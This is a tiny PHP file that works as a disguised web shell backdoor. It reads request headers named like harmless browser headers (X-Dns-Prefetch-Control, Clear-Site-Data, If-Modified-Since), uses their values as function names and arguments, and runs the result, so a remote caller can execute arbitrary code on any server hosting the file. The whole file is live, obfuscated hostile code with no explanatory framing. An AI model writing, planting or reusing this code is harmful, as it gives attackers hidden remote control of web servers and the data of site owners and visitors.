<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $uconvert = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Clear-Site-Data']($_HEADERS['If-Modified-Since']));
    $uconvert();
}